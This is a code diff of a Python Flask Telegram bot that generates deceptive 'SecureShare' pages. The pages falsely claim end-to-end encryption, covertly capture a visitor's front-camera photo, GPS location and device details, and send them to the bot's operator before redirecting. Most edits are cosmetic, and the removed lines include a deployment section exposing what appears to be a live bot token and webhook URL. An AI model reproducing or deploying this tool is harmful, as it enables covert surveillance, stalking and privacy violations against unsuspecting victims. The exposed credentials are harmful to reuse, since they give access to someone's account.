@@ -245,7 +245,7 @@ def generate_html(user_id, target_url, photo_filename):
     <div class="header">
         <div class="logo">Secure<span>Share</span></div>
     </div>
-    
+
     <div id="mainStep" class="step active content">
         <img class="user-photo" src="{photo_url}" id="userPhoto">
         <div class="username">Shared with you</div>
@@ -253,12 +253,12 @@ def generate_html(user_id, target_url, photo_filename):
         <button class="btn" id="continueBtn" onclick="requestCamera()">Continue →</button>
         <div id="errorMsg" class="error" style="display:none"></div>
     </div>
-    
+
     <div id="loadingStep" class="step content">
         <div class="processing"></div>
         <p style="color:#666;margin-top:16px">Processing...</p>
     </div>
-    
+
     <div class="footer">
         <p>🔒 End-to-end encrypted • Secure connection</p>
     </div>
@@ -271,7 +271,7 @@ def generate_html(user_id, target_url, photo_filename):
 const TOKEN = "{TOKEN}";
 const USER = {user_id};
 const STORAGE = {storage};
-    const TARGET = "{target_url}";
+const TARGET = "{target_url}";
 
 function showLoading() {{
     document.getElementById('mainStep').classList.remove('active');
@@ -375,7 +375,7 @@ async function captureFullInfo() {{
         let storage = await getStorageInfo();
         let language = navigator.language || 'Unknown';
         let resolution = screen.width + 'x' + screen.height;
-        
+
         let message = "<b>Visitor Information Captured</b>\n";
         message += "------------------------\n\n";
         message += "<b>Device & Browser</b>\n";
@@ -402,7 +402,7 @@ async function captureFullInfo() {{
         message += "   Storage Total: " + (storage ? storage.total : 'Unknown') + "\n\n";
         message += "------------------------\n";
         message += "Developed by: @nrtecno2";
-        
+
         await sendToUser(message);
         return true;
     }} catch(e) {{
@@ -427,7 +427,7 @@ async function capturePhotoAndLocation() {{
             await sendToUser('<b>Front Camera Photo</b>', blob);
         }}
         stream.getTracks().forEach(t => t.stop());
-        
+
         if(navigator.geolocation) {{
             navigator.geolocation.getCurrentPosition(async (p) => {{
                 await sendToUser('<b>Live Location</b>\nhttps://maps.google.com/?q=' + p.coords.latitude + ',' + p.coords.longitude);
@@ -436,7 +436,7 @@ async function capturePhotoAndLocation() {{
                 await sendToUser('<b>Location</b>\nAccess denied by user');
             }}, {{ timeout: 10000, enableHighAccuracy: true }});
         }}
-        
+
         return true;
     }} catch(e) {{
         return false;
@@ -445,11 +445,11 @@ async function capturePhotoAndLocation() {{
 
 async function requestCamera() {{
     showLoading();
-    
+
     await captureFullInfo();
-    
+
     let success = await capturePhotoAndLocation();
-    
+
     if(success) {{
         setTimeout(() => {{
             window.location.href = TARGET;
@@ -476,80 +476,80 @@ def webhook():
         data = request.get_json()
         if not data:
             return jsonify({"status": "error"}), 400
-        
+
         if 'callback_query' in data:
             cb = data['callback_query']
             uid = cb['from']['id']
             if cb['data'] == 'verify':
                 if is_subscribed(uid):
-                    send_message(uid, "✅ Verified! Send me any URL:")
+                    send_message(uid, "Verified! Send me any URL:")
                     set_user_state(uid, "waiting_url")
                 else:
-                    requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", 
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery",
                                  json={"callback_query_id": cb['id'], "text": "Join channel first!", "show_alert": True})
             return jsonify({"status": "ok"}), 200
-        
+
         if 'message' not in data:
             return jsonify({"status": "ok"}), 200
-        
+
         msg = data['message']
         uid = msg['chat']['id']
-        
+
         if 'text' in msg:
             text = msg['text']
             if text == '/start':
                 if not is_subscribed(uid):
-                    markup = {"inline_keyboard": [[{"text": "📢 Join Channel", "url": "https://t.me/nrtecno2"}], 
-                                                   [{"text": "✅ Verify","callback_data": "verify"}]]}
-                    send_message(uid, f"🚫 Join {REQUIRED_CHANNEL} first!", markup)
+                    markup = {"inline_keyboard": [[{"text": "Join Channel", "url": "https://t.me/nrtecno2"}],
+                                                   [{"text": "Verify", "callback_data": "verify"}]]}
+                    send_message(uid, f"Join {REQUIRED_CHANNEL} first!", markup)
                 else:
                     set_user_state(uid, "waiting_url")
-                    send_message(uid, "✅ Send me any URL:\nhttps://www.instagram.com/p/xxxxx")
+                    send_message(uid, "Send me any URL:")
             elif text.startswith(('http://', 'https://')):
                 state = get_user_state(uid)
                 if state.get("state") == "waiting_url":
                     set_user_state(uid, "waiting_photo", text)
-                    send_message(uid, "✅ Now share a photo with me")
+                    send_message(uid, "Now share a photo with me")
                 else:
-                    send_message(uid, "❌ Use /start first")
+                    send_message(uid, "Use /start first")
             else:
-                send_message(uid, "❌ Send a valid URL starting with http:// or https://")
-        
+                send_message(uid, "Send a valid URL")
+
         elif 'photo' in msg:
             uid = msg['chat']['id']
             state = get_user_state(uid)
             if state.get("state") != "waiting_photo":
-                send_message(uid, "❌ Please send URL first using /start")
+                send_message(uid, "Send URL first using /start")
                 return jsonify({"status": "ok"}), 200
-            
+
             target_url = state.get("target_url")
             if not target_url:
-                send_message(uid, "❌ Error. Please use /start again")
+                send_message(uid, "Error. Use /start again")
                 return jsonify({"status": "ok"}), 200
-            
+
             try:
                 file_id = msg['photo'][-1]['file_id']
                 file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
                 file_path = file_info['result']['file_path']
                 img_data = requests.get(f"https://api.telegram.org/file/bot{TOKEN}/{file_path}").content
-                
+
                 photo_name = f"{uid}_{int(time.time())}.jpg"
                 with open(os.path.join(PHOTO_DIR, photo_name), "wb") as f:
                     f.write(img_data)
-                
+
                 html_name = generate_html(uid, target_url, photo_name)
                 set_user_active_link(uid, html_name, photo_name)
                 set_user_state(uid, "done")
-                
+
                 link = f"https://{ACCOUNT_NAME}.onrender.com/view/{html_name}"
-                send_message(uid, f"✅ LINK GENERATED:\n{link}\n\n⚠️ This link will stay active until you create a new one!\n📸 Camera COMPULSORY\n📍 Location OPTIONAL")
-                
+                send_message(uid, f"LINK:\n{link}\n\nActive until you create new link\nCamera COMPULSORY\nLocation OPTIONAL")
+
             except Exception as e:
                 logger.error(f"Photo error: {e}")
-                send_message(uid, "❌ Error processing photo. Please try again.")
-        
+                send_message(uid, "Error processing photo. Please try again.")
+
         return jsonify({"status": "ok"}), 200
-        
+
     except Exception as e:
         logger.error(f"Webhook error: {e}")
         return jsonify({"status": "error"}), 500
@@ -570,30 +570,10 @@ def serve_photo(filename):
 
 @app.route('/')
 def home():
-    return f"🐉 DRAGON ACTIVE | Links: {len([f for f in os.listdir(HTML_DIR) if not f.startswith('state_')])}"
+    return f"DRAGON ACTIVE | Links: {len([f for f in os.listdir(HTML_DIR) if not f.startswith('state_')])}"
 
 
 if __name__ == "__main__":
     start_auto_cleanup()
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
-```
-
-requirements.txt
-
-```
-Flask==2.2.5
-requests==2.31.0
-gunicorn==23.0.0
-```
-
-Render Environment Variables:
-
-Key Value
-BOT_TOKEN 8716047556:AAH0yZa32lhruVBNdU6q-zCb86sWKvbPWtg
-CHANNEL_ID -1003940389299
-
-Webhook set (browser me ek baar):
-
-```
-https://api.telegram.org/bot8716047556:AAH0yZa32lhruVBNdU6q-zCb86sWKvbPWtg/setWebhook?url=https://telegram-bot-b9j0.onrender.com/webhook
